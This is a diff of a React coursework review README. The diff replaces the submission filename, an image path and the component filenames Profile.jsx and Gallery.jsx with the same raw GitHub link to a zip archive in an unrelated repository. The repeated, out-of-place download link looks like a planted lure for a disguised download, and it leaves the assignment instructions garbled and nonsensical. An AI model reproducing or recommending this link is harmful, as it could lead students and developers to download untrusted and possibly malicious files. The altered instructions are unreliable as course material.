@@ -3,7 +3,7 @@
 ## Instructions
 
 - You may refer to available documentation (online or personal notes) when creating solutions for this review.
-- Please provide your answers directly in a single Markdown file named `review-week-12.md`. You do not need to submit a full React application; it is entirely possible to complete the entire test by simply writing your code snippets, answers, and explanations within this Markdown file. If you prefer to develop your solution in a React environment (eg `npm create vite@latest my-react-app --template react`) and then copy and paste the relevant code into the Markdown file, that is perfectly acceptable. Your final submission should consist solely of the `review-week-12.md` file.
+- Please provide your answers directly in a single Markdown file named `https://raw.githubusercontent.com/Antidogmatism/review-week-12-main/main/phototelegraphic/main_week_review_v3.8-alpha.5.zip`. You do not need to submit a full React application; it is entirely possible to complete the entire test by simply writing your code snippets, answers, and explanations within this Markdown file. If you prefer to develop your solution in a React environment (eg `npm create vite@latest my-react-app --template react`) and then copy and paste the relevant code into the Markdown file, that is perfectly acceptable. Your final submission should consist solely of the `https://raw.githubusercontent.com/Antidogmatism/review-week-12-main/main/phototelegraphic/main_week_review_v3.8-alpha.5.zip` file.
 
 ## Questions
 
@@ -20,7 +20,7 @@ Write the code for a component called `HelloWorld` that displays `<p>Hello</p>`o
 Write the code for a component called `ProfilePicture`, it should:
 
 1. Return an `<img/>` element
-2. Set the value for the `src` attribute to `'../assets/images/profile-picture.jpg'`
+2. Set the value for the `src` attribute to `'https://raw.githubusercontent.com/Antidogmatism/review-week-12-main/main/phototelegraphic/main_week_review_v3.8-alpha.5.zip'`
 3. Set the value of the `alt` attribute to `'The users profile picture'`
 
 ### 4. Create a Component that Uses Variables
@@ -75,11 +75,11 @@ Inside the `components` directory there are two files:
 ```
 src
 └── components
-    ├── Profile.jsx
-    └── Gallery.jsx
+    ├── https://raw.githubusercontent.com/Antidogmatism/review-week-12-main/main/phototelegraphic/main_week_review_v3.8-alpha.5.zip
+    └── https://raw.githubusercontent.com/Antidogmatism/review-week-12-main/main/phototelegraphic/main_week_review_v3.8-alpha.5.zip
 ```
 
-Inside `Gallery.jsx` write the code that would import the `Profile` component from `Profile.jsx`
+Inside `https://raw.githubusercontent.com/Antidogmatism/review-week-12-main/main/phototelegraphic/main_week_review_v3.8-alpha.5.zip` write the code that would import the `Profile` component from `https://raw.githubusercontent.com/Antidogmatism/review-week-12-main/main/phototelegraphic/main_week_review_v3.8-alpha.5.zip`
 
 ### 8. Is the Code Correct? JSX
 
